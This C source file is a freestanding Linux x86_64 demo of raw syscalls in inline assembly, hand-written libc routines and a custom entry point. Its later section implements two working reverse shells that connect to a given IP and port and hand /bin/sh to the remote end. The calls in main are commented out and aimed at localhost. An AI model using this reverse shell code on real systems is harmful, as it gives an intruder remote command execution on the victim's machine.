// Minimal Linux x86_64 "nolibs" syscall & libc implementation demo with reverse shell
// 
// This project demonstrates:
// - Bare metal syscall implementations using inline assembly (Intel syntax)
// - Minimal libc function implementations (printf, memset, memcpy, memmove)
// - Reverse shell implementation using pure inline assembly (no shellcode)
// - All code uses Intel assembly syntax with operand numbers (%0, %1, etc.)
// - No standard library dependencies - completely freestanding
//
// Compilation:
//   gcc -nostdlib -nostdinc -ffreestanding -fno-builtin -fno-common -masm=intel -s -Wl,--build-id=0x31313131 -o nolibs nolibs.c


// Flags explanation:
// -nostdlib     : Don't use standard library (no libc)
// -nostdinc     : Don't use standard include directories (no system headers)
// -ffreestanding: Compile for freestanding environment (no standard library available)
// -fno-builtin  : Don't recognize builtin functions (prevents libc function calls)
// -fno-common   : Don't allow common symbols (prevents duplicate definitions)
// -masm=intel   : Use Intel assembly syntax
// -s            : Strip all symbols (equivalent to strip command)
// -Wl,--build-id=sha1:... : Set custom build ID (SHA1 hash)
//                          You can also use other hash functions:
//                          -Wl,--build-id=md5:... (MD5 hash)
//                          -Wl,--build-id=uuid:... (UUID format)
//                          -Wl,--build-id=0x12345678 (hex value)
//                          -o nolibs     : Output filename







// System call numbers (from Linux x86-64 ABI)
// https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
#define SYS_READ 0
#define SYS_WRITE 1
#define SYS_OPEN 2
#define SYS_CLOSE 3
#define SYS_NANOSLEEP 35
#define SYS_SOCKET 41
#define SYS_CONNECT 42
#define SYS_ACCEPT 43
#define SYS_RECV 45
#define SYS_BIND 49
#define SYS_LISTEN 50
#define SYS_DUP2 33
#define SYS_EXECVE 59
#define SYS_EXIT 60


// IMPORTANT: I prefer BSD macros, because they are more readable and easier to understand.


// https://github.com/openbsd/src/blob/master/sys/sys/fcntl.h
// open-only flags
#define O_RDONLY    0x0000      // open for reading only
#define O_WRONLY    0x0001      // open for writing only
#define O_RDWR      0x0002      // open for reading and writing
#define O_ACCMODE   0x0003      // mask for above modes
#define O_CREAT     0x0200      // create if nonexistent

// https://github.com/openbsd/src/blob/master/include/unistd.h
// standard file descriptors
#define STDIN_FILENO    0   // standard input file descriptor
#define STDOUT_FILENO   1   // standard output file descriptor
#define STDERR_FILENO   2   // standard error file descriptor

// https://github.com/openbsd/src/blob/master/sys/sys/_null.h
#define NULL    ((void *)0)

// https://github.com/openbsd/src/blob/master/sys/sys/limits.h
#define INT_MIN     (-0x7fffffff-1) // min value for an int
#define INT_MAX     0x7fffffff      // max value for an int







// Type definitions (no libc, so we define our own)
typedef struct timespec {
    long tv_sec;
    long tv_nsec;
} timespec;

typedef unsigned int mode_t;
typedef unsigned int socklen_t;

// Socket address structures
struct sockaddr {
    unsigned short sa_family;
    char sa_data[14];
};



// ================== SYSTEM CALL WRAPPERS ==================
//
// These functions provide a clean interface to Linux syscalls using inline assembly.
// All syscalls use Intel syntax with operand numbers for maximum portability.
// Each wrapper handles a different number of parameters (1-4 parameters).
//
// Important notes:
// - All syscalls use "r" constraint (general register) instead of specific registers
// - Clobber lists are essential to prevent GCC from reusing modified registers
// - Memory clobber is included because syscalls may modify memory
// - Return value is always in rax register after syscall

// Detailed documentation about GCC inline assembly:
//https://www.felixcloutier.com/documents/gcc-asm.html

static long
syscall1(long sys_num, long a1)
{
    long ret;
    __asm__ __volatile__(
        "mov rax, %[num]\n"
        "mov rdi, %[a1]\n"
        "syscall\n"
        : "=a"(ret)
        : [num] "r"(sys_num), [a1] "r"(a1)
        : "rdi", "rsi", "rdx", "rcx", "r11", "memory"
        // Clobber list: syscall modifies rdi, rsi, rdx, rcx, r11
        // Even though we only use rdi, syscall instruction modifies rcx and r11
    );
    return ret;
}

static long
syscall2(long n, long a1, long a2)
{
    long ret;
    __asm__ __volatile__(
        "mov rax, %[num]\n"
        "mov rdi, %[a1]\n"
        "mov rsi, %[a2]\n"
        "syscall\n"
        : "=a"(ret)
        : [num] "r"(n), [a1] "r"(a1), [a2] "r"(a2)
        : "rdi", "rsi", "rdx", "rcx", "r11", "memory"
        // Clobber list: syscall modifies rdi, rsi, rdx, rcx, r11
        // Without this, GCC might reuse these registers incorrectly
    );
    return ret;
}

static long
syscall3(long n, long a1, long a2, long a3)
{
    long ret;
    __asm__ __volatile__(
        // Assembly instructions:
        // Load syscall number and parameters into registers
        "mov rax, %[num]\n"    // rax = syscall number (n)
        "mov rdi, %[a1]\n"     // rdi = first parameter (a1)
        "mov rsi, %[a2]\n"     // rsi = second parameter (a2)
        "mov rdx, %[a3]\n"     // rdx = third parameter (a3)
        "syscall\n"            // Execute system call
        
        // Output operands (what we get back):
        : "=a"(ret)            // Return value: ret = rax (syscall return value)
        
        // Input operands (what we pass in):
        : [num] "r"(n),        // %[num] = n (syscall number) in any register
          [a1] "r"(a1),        // %[a1] = a1 (first param) in any register
          [a2] "r"(a2),        // %[a2] = a2 (second param) in any register
          [a3] "r"(a3)         // %[a3] = a3 (third param) in any register
        
        // Clobber list (registers that get modified):
        // CRITICAL: Without this, GCC might reuse these registers incorrectly!
        : "rdi",               // Modified: used for 1st parameter
          "rsi",               // Modified: used for 2nd parameter
          "rdx",               // Modified: used for 3rd parameter
          "rcx",               // Modified: syscall instruction uses this for return address
          "r11",               // Modified: syscall instruction uses this for flags
          "memory"             // Modified: memory may change (prevents GCC from caching)
        
        // Why clobber list is necessary:
        // ------------------------------
        // GCC doesn't know which registers syscall modifies. If we don't tell it:
        // - GCC might keep variables in rdi/rsi/rdx registers
        // - After syscall, those registers contain different values
        // - Result: corrupted data, wrong calculations
        //
        // Example bug without clobber:
        //   int x = 5;           // GCC stores x in rdi
        //   syscall3(...);       // syscall modifies rdi!
        //   int y = x + 10;      // GCC reads rdi, but it's corrupted! WRONG!
        //
        // With clobber list, GCC knows to:
        // - Save/restore these registers if needed
        // - Not reuse them for other variables
        // - Generate correct code
    );
    return ret;
}

static long
syscall4(long n, long a1, long a2, long a3, long a4)
{
    long ret;
    __asm__ __volatile__(
        "mov rax, %[num]\n"
        "mov rdi, %[a1]\n"
        "mov rsi, %[a2]\n"
        "mov rdx, %[a3]\n"
        "mov rcx, %[a4]\n"
        "syscall\n"
        : "=a"(ret)
        : [num] "r"(n), [a1] "r"(a1), [a2] "r"(a2), [a3] "r"(a3), [a4] "r"(a4)
        : "rdi", "rsi", "rdx", "rcx", "r11", "memory"
        // Clobber list: syscall modifies rdi, rsi, rdx, rcx, r11
        // Note: rcx is used for 4th parameter, but syscall also modifies it
        // r11 is always modified by syscall instruction (flags register)
    );
    return ret;
}

static long
syscall5(long n, long a1, long a2, long a3, long a4, long a5)
{
    long ret;
    __asm__ __volatile__(
        "mov rax, %[num]\n"
        "mov rdi, %[a1]\n"
        "mov rsi, %[a2]\n"
        "mov rdx, %[a3]\n"
        "mov rcx, %[a4]\n"
        "mov r8, %[a5]\n"
        "syscall\n"
        : "=a"(ret)
        : [num] "r"(n), [a1] "r"(a1), [a2] "r"(a2), [a3] "r"(a3), [a4] "r"(a4), [a5] "r"(a5)
        : "rdi", "rsi", "rdx", "rcx", "r8", "r11", "memory"
        // Clobber list: syscall modifies rdi, rsi, rdx, rcx, r8, r11
        // Note: rcx is used for 4th parameter, but syscall also modifies it
        // r11 is always modified by syscall instruction (flags register)
    );
    return ret;
}

static long
syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6)
{
    long ret;
    __asm__ __volatile__(
        "mov rax, %[num]\n"
        "mov rdi, %[a1]\n"
        "mov rsi, %[a2]\n"
        "mov rdx, %[a3]\n"
        "mov rcx, %[a4]\n"
        "mov r8, %[a5]\n"
        "mov r9, %[a6]\n"
        "syscall\n"
        : "=a"(ret)
        : [num] "r"(n), [a1] "r"(a1), [a2] "r"(a2), [a3] "r"(a3), [a4] "r"(a4), [a5] "r"(a5), [a6] "r"(a6)
        : "rdi", "rsi", "rdx", "rcx", "r8", "r9", "r11", "memory"
        // Clobber list: syscall modifies rdi, rsi, rdx, rcx, r8, r9, r11
        // Note: rcx is used for 4th parameter, but syscall also modifies it
        // r11 is always modified by syscall instruction (flags register)
    );
    return ret;
}

// ================== END OF SYSTEM CALL WRAPPERS ==================











// ================== SYSTEM CALL IMPLEMENTATIONS ==================
//
// High-level syscall wrapper functions that use the low-level syscall wrappers.
// These functions provide a more convenient interface for common operations.
// All functions use the syscall1-4 wrappers which handle the inline assembly.
//
// Available syscalls:
// - File operations: open, read, write, close
// - Socket operations: socket, bind, listen, accept, connect, recv
// - Process operations: execve, exit, dup2
// - Time operations: nanosleep, sleep

// Exit syscall: sys_exit(int status)
static __attribute__((noreturn)) void
sys_exit(int code)
{
    // __asm__ __volatile__(
    //     "mov rax, 60\n"
    //     "mov edi, %[c]\n"    // use edi (32-bit) because code is int (32-bit)
    //     "syscall\n"
    //     :
    //     : [c] "r"(code)
    //     : "rax", "rdi"
    // );
    // __builtin_unreachable();
    syscall2(SYS_EXIT, code, 0);
    __builtin_unreachable();    // this is a builtin function, it tells the compiler that this code is unreachable
}

static void
sys_write(int fd, const char *buf, __SIZE_TYPE__ count)
{
    syscall3(SYS_WRITE, fd, (long)buf, count);
}

// nanosleep syscall: sys_nanosleep(const struct timespec *req, struct timespec *rem)
// Returns 0 on success, -1 on error (e.g., EINTR if interrupted by signal)
static int
sys_nanosleep(const struct timespec *req, struct timespec *rem)
{
    return syscall2(SYS_NANOSLEEP, (long) req, (long) rem);
}

// sleep syscall: sys_sleep(unsigned int seconds)
// Returns 0 on success, -1 on error
static int
sys_sleep(unsigned int seconds)
{
    struct timespec req = { seconds, 0 };
    struct timespec rem;
    return sys_nanosleep(&req, &rem);
}

// implement sys_socket
static int
sys_socket(int domain, int type, int protocol)
{
    return syscall3(SYS_SOCKET, domain, type, protocol);
}

// implement sys_close
static int
sys_close(int fd)
{
    return syscall1(SYS_CLOSE, fd);
}

// implement sys_bind
static int
sys_bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
    return syscall3(SYS_BIND, sockfd, (long) addr, addrlen);
}

// implement sys_listen
static int
sys_listen(int sockfd, int backlog)
{
    return syscall2(SYS_LISTEN, sockfd, backlog);
}

// implement sys_accept
static int
sys_accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
    return syscall3(SYS_ACCEPT, sockfd, (long) addr, (long) addrlen);
}

// implement sys_recv
static int
sys_recv(int sockfd, void *buf, __SIZE_TYPE__ len, int flags)
{
    return syscall4(SYS_RECV, sockfd, (long)buf, len, flags);
}

// implement sys_connect
static int
sys_connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
    return syscall3(SYS_CONNECT, sockfd, (long) addr, addrlen);
}

// implement sys_dup2
static int
sys_dup2(int oldfd, int newfd)
{
    return syscall2(SYS_DUP2, oldfd, newfd);
}

// implement sys_execve
static int
sys_execve(const char *pathname, char *const argv[], char *const envp[])
{
    return syscall3(SYS_EXECVE, (long)pathname, (long)argv, (long)envp);
}

// implement sys_open
static int
sys_open(const char *pathname, int flags, mode_t mode)
{
    return syscall3(SYS_OPEN, (long)pathname, flags, (long) mode);
}

// implement sys_read
static int
sys_read(int fd, void *buf, __SIZE_TYPE__ len)
{
    return syscall3(SYS_READ, fd, (long) buf, len);
}

// ================== END OF SYSTEM CALL IMPLEMENTATIONS ==================














// ================== LIBC IMPLEMENTATIONS ==================
//
// Minimal implementations of standard C library functions.
// These are required because we compile with -nostdlib flag.
// All functions are implemented from scratch using our syscall wrappers.
//
// Implemented functions:
// - printf: Basic printf with %d, %s, %p, %% format specifiers
// - memset: Set memory to a specific value
// - memcpy: Copy memory (assumes non-overlapping regions)
// - memmove: Copy memory (handles overlapping regions correctly)
// - ft_putnbr: Print integer (used by printf for %d)
// - ft_putptr: Print pointer in hexadecimal format (used by printf for %p)


static void
ft_putnbr(int n)
{
    // Handle INT_MIN (-2147483648) special case to avoid overflow
    if (n == INT_MIN) {
        sys_write(1, "-2147483648", 11);
        return;
    }
    if (n < 0) {
        sys_write(1, "-", 1);
        n = -n;
    }
    if (n > 9) {
        ft_putnbr(n / 10);
    }
    sys_write(1, &"0123456789"[n % 10], 1);
}

static void
ft_putptr(void *ptr)
{
    // Print pointer address in hexadecimal format (e.g., 0x7fff12345678)
    // x86_64 pointers are 64-bit, so we need 16 hexadecimal digits
    
    if (!ptr) {
        // NULL pointer special case
        sys_write(1, "(nil)", 5);
        return;
    }
    
    // Print "0x" prefix
    sys_write(1, "0x", 2);
    
    // Convert pointer to unsigned long long for processing
    unsigned long long addr = (unsigned long long)ptr;
    
    // Find the most significant non-zero nibble to avoid leading zeros
    int leading_zeros = 1;
    unsigned long long temp = addr;
    int shift = 60;  // Start from most significant nibble (60 bits = 15 hex digits)
    
    // Skip leading zeros
    while (shift >= 0 && (temp >> shift) == 0) {
        shift -= 4;
    }
    
    // If all zeros, print at least one digit
    if (shift < 0) {
        sys_write(1, "0", 1);
        return;
    }
    
    // Print hexadecimal digits from most significant to least significant
    while (shift >= 0) {
        unsigned char nibble = (unsigned char)((addr >> shift) & 0xF);
        char hex_char;
        
        if (nibble < 10) {
            hex_char = '0' + nibble;
        } else {
            hex_char = 'a' + (nibble - 10);
        }
        
        sys_write(1, &hex_char, 1);
        shift -= 4;
    }
}

static int
printf(const char *format, ...)
{
    __builtin_va_list ap;
    __builtin_va_start(ap, format);
    
    while (*format) {
        if (*format == '%') {
            format++;
            // Check if we reached end of string after %
            if (!*format) {
                sys_write(1, "%", 1);
                break;
            }
            if (*format == 'd') {
                // Get integer argument using GCC builtin
                int value = __builtin_va_arg(ap, int);
                ft_putnbr(value);
            } else if (*format == 's') {
                // Get string pointer argument using GCC builtin
                const char *str = __builtin_va_arg(ap, const char *);
                // Handle NULL pointer
                if (!str) {
                    sys_write(1, "(null)", 6);
                } else {
                    __SIZE_TYPE__ len = 0;
                    while (str[len] && len < 4096) ++len;
                    sys_write(1, str, len);
                }
            } else if (*format == 'p') {
                // Get pointer argument using GCC builtin
                void *ptr = __builtin_va_arg(ap, void *);
                ft_putptr(ptr);
            } else if (*format == '%') {
                // Handle %% -> print single %
                sys_write(1, "%", 1);
            } else {
                // Unknown format specifier, print it literally
                sys_write(1, "%", 1);
                sys_write(1, format, 1);
            }
        } else {
            sys_write(1, format, 1);
        }
        format++;
    }
    
    __builtin_va_end(ap);
    return 0;
}

// implement memset
// Sets the first n bytes of s to the value c (converted to unsigned char)
static void *
memset(void *s, int c, __SIZE_TYPE__ n)
{
    unsigned char *p = (unsigned char *)s;
    __SIZE_TYPE__ i = 0;
    // Only use the low 8 bits of c (C standard requirement)
    unsigned char uc = (unsigned char)c;
    while (i < n) {
        p[i] = uc;
        i++;
    }
    return s;
}


// implement memcpy
static void *
memcpy(void *dest, const void *src, __SIZE_TYPE__ n)
{
    __SIZE_TYPE__ i = 0;
    while (i < n) {
        ((unsigned char *)dest) [i] = ((unsigned char *)src) [i];
        i++;
    }
    return dest;
}

// implement memmove, consider overlapping memory regions
// Copies n bytes from src to dest, handling overlapping regions correctly
// If dest < src: copy forward (from start to end)
// If dest >= src: copy backward (from end to start) to avoid overwriting source
static void *
memmove(void *dest, const void *src, __SIZE_TYPE__ n)
{
    unsigned char *d = (unsigned char *)dest;
    const unsigned char *s = (const unsigned char *)src;
    
    if (d < s) {
        // Forward copy: dest is before src, safe to copy from start
        __SIZE_TYPE__ i = 0;
        while (i < n) {
            d[i] = s[i];
            i++;
        }
    } else if (d > s) {
        // Backward copy: dest is after src, copy from end to avoid overwriting
        __SIZE_TYPE__ i = n;
        while (i > 0) {
            i--;
            d[i] = s[i];
        }
    }
    // If d == s, nothing to copy (same memory region)
    return dest;
}

// ================== END OF LIBC IMPLEMENTATIONS ==================




// ================== REVERSE SHELL IMPLEMENTATION ==================
//
// This implementation uses pure inline assembly (Intel syntax) to create a reverse shell.
// No shellcode is used - all syscalls are made directly through inline assembly.
// The function connects to a remote host and spawns /bin/sh, redirecting I/O through the socket.
//
// Key features:
// - All syscalls use inline assembly with Intel syntax
// - Operand numbers (%0, %1, etc.) are used instead of specific register constraints
// - Network byte order conversion using inline assembly (ror, bswap instructions)
// - Proper error handling with printf statements
// - File descriptor redirection using dup2 syscall
// - Shell execution using execve syscall
//
// Reverse shell structure for sockaddr_in
struct sockaddr_in {
    unsigned short sin_family;  // AF_INET = 2
    unsigned short sin_port;    // Port in network byte order
    unsigned int sin_addr;      // IP address in network byte order
    unsigned char sin_zero[8];  // Padding
};

// Reverse shell function using inline assembly
// Connects to IP:PORT and spawns /bin/sh
// 
// Parameters:
//   - ip: IP address in host byte order (e.g., 0x7f000001 for 127.0.0.1)
//   - port: Port number in host byte order (e.g., 31337)
//
// Workflow:
//   1. Convert port and IP to network byte order using inline assembly
//   2. Create TCP socket (socket syscall)
//   3. Connect to remote host (connect syscall)
//   4. Redirect stdin, stdout, stderr to socket (dup2 syscall, 3 times)
//   5. Execute /bin/sh (execve syscall)
//
// Note: This function never returns (noreturn attribute)
static void __attribute__((noreturn))
reverse_shell(unsigned int ip, unsigned short port)
{
    long sockfd;
    struct sockaddr_in addr;
    
    // Prepare sockaddr_in structure using inline assembly
    // Convert port to network byte order (big-endian): swap bytes
    // https://stackoverflow.com/questions/28889971/understanding-x86-64bit-ror-shl
    unsigned short port_net;
    __asm__ __volatile__(
        "ror ax, 8\n"                  // Rotate right 8 bits: swap high and low bytes
        : "=a"(port_net)
        : "a"(port)
        : "memory"
    );
    
    // Convert IP to network byte order (big-endian): reverse all 4 bytes
    // https://www.felixcloutier.com/x86/bswap
    unsigned int ip_net;
    __asm__ __volatile__(
        "bswap %0\n"                   // Byte swap: reverse byte order of 32-bit value
        : "=r"(ip_net)
        : "0"(ip)
        : "memory"
    );

    // Initialize sockaddr_in structure
    addr.sin_family = 2;  // AF_INET
    addr.sin_port = port_net;
    addr.sin_addr = ip_net;
    
    // Clear sin_zero using inline assembly
    __asm__ __volatile__(
        "xor rax, rax\n"
        "mov QWORD PTR [%0+8], rax\n"
        :                               // No output operands
        : "r"(&addr)
        : "rax", "memory"
    );

    // Create socket using inline assembly
    __asm__ __volatile__(
        "mov rax, %[socket_num]\n"      // SYS_SOCKET = 41
        "mov rdi, 2\n"                  // AF_INET
        "mov rsi, 1\n"                  // SOCK_STREAM
        "mov rdx, 6\n"                  // IPPROTO_TCP
        "syscall\n"
        "mov %[sockfd], rax\n"
        : [sockfd] "=r"(sockfd)
        : [socket_num] "i"(SYS_SOCKET)
        : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
    );

    if (sockfd < 0) {
        printf("Error: failed to create socket, status: %d\n", (int) sockfd);
        sys_exit(1);
    }

    // Connect to remote host using inline assembly
    long connect_result;
    __asm__ __volatile__(
        "mov rax, %[connect_num]\n"     // SYS_CONNECT = 42
        "mov rdi, %[sockfd]\n"
        "mov rsi, %[addr]\n"
        "mov rdx, 16\n"                 // sizeof(struct sockaddr_in)
        "syscall\n"
        "mov %[result], rax\n"
        : [result] "=r"(connect_result)
        : [connect_num] "i"(SYS_CONNECT), [sockfd] "r"(sockfd), [addr] "r"(&addr)
        : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
    );
    
    if (connect_result < 0) {
        printf("Error: failed to connect to remote host, status: %d\n", (int) connect_result);
        sys_exit(1);
    }
    
    // Duplicate file descriptors: stdin, stdout, stderr -> socket
    // dup2(sockfd, 0) - stdin
    __asm__ __volatile__(
        "mov rax, %[dup2_num]\n"        // SYS_DUP2 = 33
        "mov rdi, %[sockfd]\n"
        "mov rsi, 0\n"                  // STDIN_FILENO
        "syscall\n"
        :                               // No output operands
        : [dup2_num] "i"(SYS_DUP2), [sockfd] "r"(sockfd)
        : "rax", "rdi", "rsi", "rcx", "r11", "memory"
    );
    
    // dup2(sockfd, 1) - stdout
    __asm__ __volatile__(
        "mov rax, %[dup2_num]\n"
        "mov rdi, %[sockfd]\n"
        "mov rsi, 1\n"                  // STDOUT_FILENO
        "syscall\n"
        :                               // No output operands
        : [dup2_num] "i"(SYS_DUP2), [sockfd] "r"(sockfd)
        : "rax", "rdi", "rsi", "rcx", "r11", "memory"
    );
    
    // dup2(sockfd, 2) - stderr
    __asm__ __volatile__(
        "mov rax, %[dup2_num]\n"
        "mov rdi, %[sockfd]\n"
        "mov rsi, 2\n"                  // STDERR_FILENO
        "syscall\n"
        :                               // No output operands
        : [dup2_num] "i"(SYS_DUP2), [sockfd] "r"(sockfd)
        : "rax", "rdi", "rsi", "rcx", "r11", "memory"
    );
    
    // Prepare execve arguments
    // argv[0] = "/bin/sh"
    // argv[1] = NULL
    // envp = NULL
    char *sh_path = "/bin/sh";
    char *argv[2];
    argv[0] = sh_path;
    argv[1] = NULL;
    
    // Execute /bin/sh using inline assembly
    __asm__ __volatile__(
        "mov rax, %[execve_num]\n"      // SYS_EXECVE = 59
        "mov rdi, %[path]\n"            // pathname
        "mov rsi, %[argv]\n"            // argv
        "mov rdx, 0\n"                  // envp = NULL
        "syscall\n"
        :                               // No output operands
        : [execve_num] "i"(SYS_EXECVE), [path] "r"(sh_path), [argv] "r"(argv)
        : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
    );
    
    // Should never reach here, but just in case
    sys_exit(1);
}


static void
reverse_shell2(unsigned int ip, unsigned short port)
{
    long sockfd;
    struct sockaddr_in addr;
    unsigned short port_net = port << 8 | port >> 8;
    unsigned int ip_net = ip << 24 | ip >> 24 | (ip << 8 & 0x00FF0000) | (ip >> 8 & 0x0000FF00);
    long connect_result;
    addr.sin_family = 2;
    addr.sin_port = port_net;
    addr.sin_addr = ip_net;
    memset(&addr.sin_zero, 0, sizeof(addr.sin_zero));
    sockfd = syscall3(SYS_SOCKET, 2, 1, 6);
    if (sockfd < 0) {
        printf("Error: failed to create socket, status: %d\n", (int) sockfd);
        sys_exit(1);
    }
    connect_result = syscall3(SYS_CONNECT, sockfd, (long int) &addr, 16);
    if (connect_result < 0) {
        printf("Error: failed to connect to remote host, status: %d\n", (int) connect_result);
        sys_exit(1);
    }
    syscall2(SYS_DUP2, sockfd, 0);
    syscall2(SYS_DUP2, sockfd, 1);
    syscall2(SYS_DUP2, sockfd, 2);
    syscall3(SYS_EXECVE, (long int) "/bin/sh", (long int) NULL, (long int) NULL);
}

// ================== END OF REVERSE SHELL IMPLEMENTATION ==================














// ================== MAIN FUNCTION ==================
//
// Entry point for user code. This function is called by _start after
// proper stack alignment and argument setup.
//
// Currently, main() is minimal - it just returns 0.
// To test the reverse shell, uncomment the reverse_shell() call below.
//
int
main(int argc, char **argv)
{
    // ================== REVERSE SHELL EXAMPLE ==================
    // 
    // To test the reverse shell functionality:
    // 1. Start a listener in another terminal: nc -lvp 31337
    // 2. Uncomment the line below
    // 3. Compile and run this program
    //
    // Example usage:
    //   reverse_shell(0x7f000001, 31337);  // Connect to 127.0.0.1:31337
    //
    // IP address format:
    //   - 0x7f000001 = 127.0.0.1 (localhost)
    //   - 0x0a000001 = 10.0.0.1
    //   - IP is in host byte order, will be converted to network byte order
    //
    // Port format:
    //   - 31337 (host byte order, will be converted to network byte order)
    //
    // What happens:
    //   1. Creates a TCP socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)
    //   2. Connects to the specified IP:PORT
    //   3. Redirects stdin, stdout, stderr to the socket using dup2
    //   4. Executes /bin/sh (I/O now goes through the socket)
    //
    // Note: This function never returns (noreturn attribute)
    // The program will be replaced by /bin/sh process
    // ============================================================
    // reverse_shell(0x7f000001, 31337);   // Uncomment to test
    // reverse_shell2(0x7f000001, 31337);  // Uncomment to test
    return 0;
}

// ================== PROGRAM ENTRY POINT ==================
//
// Custom _start function for no-libs setup.
// This is the real entry point of the program (not main!).
// The kernel calls _start, not main.
//
// __attribute__((naked)) tells the compiler:
// - Do not generate function prologue (no push rbp, mov rbp, rsp)
// - Do not generate function epilogue (no pop rbp, ret)
// - We have full control over the function's assembly code
//
// This is necessary because:
// - We need to set up the stack alignment manually
// - We need to extract argc and argv from the stack
// - We need to call main() and then sys_exit() with the return value
//
__attribute__((naked)) void
_start(void)
{
    // https://refspecs.linuxbase.org/elf/x86_64-abi-0.99.pdf
    __asm__ __volatile__(
        // argc in [rsp], argv in [rsp+8]
        "xor    rbp, rbp\n"          // Clear frame pointer (required by x86-64 ABI) Frame pointer should be 0 at program start
        "mov    rdi, [rsp]\n"        // Load argc from stack into rdi (1st argument) argc is at [rsp] (top of stack when _start is called)
        "lea    rsi, [rsp+8]\n"      // Load address of argv into rsi (2nd argument) argv is at [rsp+8] (8 bytes after argc, pointer to char* array)
        "and    rsp, -16\n"          // Align stack to 16-byte boundary
                                     // 
                                     // Explanation:
                                     // -16 in binary = 0xFFFFFFF0 (last 4 bits are 0)
                                     // This operation clears the last 4 bits of rsp
                                     // Result: rsp becomes a multiple of 16 (16-byte aligned)
                                     //
                                     // Why is this necessary?
                                     // 1. x86-64 ABI requires stack to be 16-byte aligned
                                     //    before function calls (especially call instruction)
                                     // 2. SSE/AVX instructions require aligned memory access
                                     // 3. Some syscalls and library functions expect aligned stack
                                     //
                                     // Example:
                                     //   If rsp = 0x7FFFFFFF1234 (not aligned)
                                     //   After: rsp = 0x7FFFFFFF1230 (aligned to 16 bytes)
                                     //
                                     // Without this, the program may crash or behave incorrectly
        "call   main\n"              // Call main(argc, argv) main's return value is in rax (exit code)
        "mov    rdi, rax\n"          // Move exit code from rax to rdi (1st syscall argument)
        "call   sys_exit\n"          // Call sys_exit(exit_code) - never returns, it will exit the program with the exit code
        :                           // output operands
        :                           // input operands
        : "rdi", "rsi", "rax"       // clobber list (registers that get modified)
    );
    // https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html
    __builtin_unreachable();    // this is a builtin function, it tells the compiler that this code is unreachable
}
